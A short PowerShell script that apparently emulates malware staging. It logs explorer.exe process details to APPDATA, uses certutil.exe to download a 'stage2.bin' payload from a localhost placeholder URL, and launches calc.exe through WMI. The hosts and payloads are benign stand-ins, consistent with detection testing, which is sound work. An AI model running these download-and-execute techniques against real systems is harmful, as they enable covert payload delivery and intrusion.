
[CmdletBinding()]
param(
    [string]$EndpointUrl = "http://localhost:8000/update.dat",
    [string]$PayloadPath = "$env:APPDATA\stage2.bin",
    [int]$TimeoutSec = 5
)
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "$env:APPDATA\telemetry.json" -Append -ErrorAction SilentlyContinue
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $OperationResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" } -ErrorAction SilentlyContinue
    Write-Verbose ("Process ID: " + $OperationResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 28 initialized"
